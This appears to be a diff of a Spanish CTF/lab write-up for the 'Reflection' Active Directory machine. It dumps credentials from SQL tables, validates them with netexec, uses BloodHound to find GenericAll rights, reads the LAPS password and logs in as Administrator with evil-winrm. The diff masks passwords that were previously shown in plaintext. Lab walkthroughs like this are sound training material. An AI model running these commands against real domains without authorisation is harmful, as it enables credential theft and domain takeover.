@@ -193,7 +193,7 @@ SQL (web_staging  guest@master)>
 ```
 
 
-Listamos las bases de datos, luego elejimos la bd staging, listamos las tablas y listamos los usuarios.
+Listamos las bases de datos, luego elejimos la bd staging, listamos las tablas y luego los datos de la tabla users.
 
 
 ```bash
@@ -318,9 +318,85 @@ $ proxychains -q smbclient \\\\10.10.191.5\\prod -U reflection/svc_web_staging
 ![](/assets/images/Reflection/reflection-smb3.png)
 
 
-user=web_prod
-password=Tribesman201
-db=prod
+user=web_prod  
+password=Trib********  
+db=prod  
+
+
+
+Al igual que hemos hecho antes, listamos las bases de datos, luego las tablas y luego los datos de la tabla users. Y obtenemos nuevas credenciales.
+
+
+
+
+![](/assets/images/Reflection/reflection-sql3.png)
+
+
+abbie.smith:CMe1x*********  
+dorothy.rose:hC_fny3*******  
+
+
+Con netexec comprobamos que las credenciales son válidas.
+
+
+```bash
+$ nxc smb 10.10.149.149-151 -u 'abbie.smith' -p 'CMe1x*********'
+```
+
+```bash
+nxc smb 10.10.149.149-151 -u 'dorothy.rose' -p 'hC_fny3*******'
+```
+
+![](/assets/images/Reflection/reflection-nxc2.png)
+
+
+Ya podemos utilizar bloodhound para buscar vulnerabilidades utilizando estas credenciales.
+
+
+```bash
+$ bloodhound.py --zip -c All -d "reflection.vl" -u "abbie.smith" -p "CMe1x*********" -dc "dc01.reflection.vl" -ns 10.10.149.149
+```
+
+
+Y vemos con bloodhound que el usuario abbie.smith tiene permisos de GenericAll sobre la máquina MS01.
+
+
+![](/assets/images/Reflection/reflection-bh.png)
+
+
+Bloodhound nos sugiere utilizar el ataque Resource Based Constrined Delegation, pero vemos que el machine account quota está a cero, con lo cual no vamos a poder crear ninguna cuenta de máquina con nuestro usuario.
+
+
+![](/assets/images/Reflection/reflection-bh2.png)
+
+
+![](/assets/images/Reflection/reflection-maq.png)
+
+
+Enumerando el dominio con bloodhound busco por LAPS para ver si está implementado en la máquina y veo que si. Y como tenemos permisos de GenericAll podemos ver la contraseña, con nxc por ejemplo.
+
+
+```bash
+nxc ldap 10.10.149.149 -u 'abbie.smith' -p 'CMe1x*********' -M laps
+```
+
+
+![](/assets/images/Reflection/reflection-laps.png)
+
+![](/assets/images/Reflection/reflection-laps2.png)
+
+
+Ya podemos conectarnos con evil-winrm y leer la primera flag.
+
+
+```bash
+evil-winrm -u "Administrator" -p "H447.*********" -i "10.10.149.150"
+```
+
+
+```powershell
+cat "C:/Users/Administrator/Desktop/flag.txt"
+```
 
 
 
